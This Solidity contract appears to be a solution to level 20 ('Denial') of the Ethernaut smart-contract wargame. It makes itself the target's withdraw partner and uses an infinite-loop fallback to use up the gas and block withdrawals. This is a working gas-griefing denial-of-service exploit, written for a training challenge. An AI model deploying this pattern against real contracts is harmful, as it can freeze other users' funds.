// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title 20. STOP
 * @dev DoS the withdraw function.
 */

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract Ethernaut_Stop {
    IDenial idenial = IDenial(0xA5aCd27F60246ebdA0dF9E55Dd78f394715747c4);

    // 1. Let's start by becoming a partner...
    function becomePartner() public {
        idenial.setWithdrawPartner(address(this));
    }

    // 2. Then making sure that we use all the gas upon receiving the ETH.
    // This useless infinite loop will effectively DoS the withdraw function.
    fallback() external payable {
        while (true) {}
    }
}

// 🎉 Level completed! 🎉
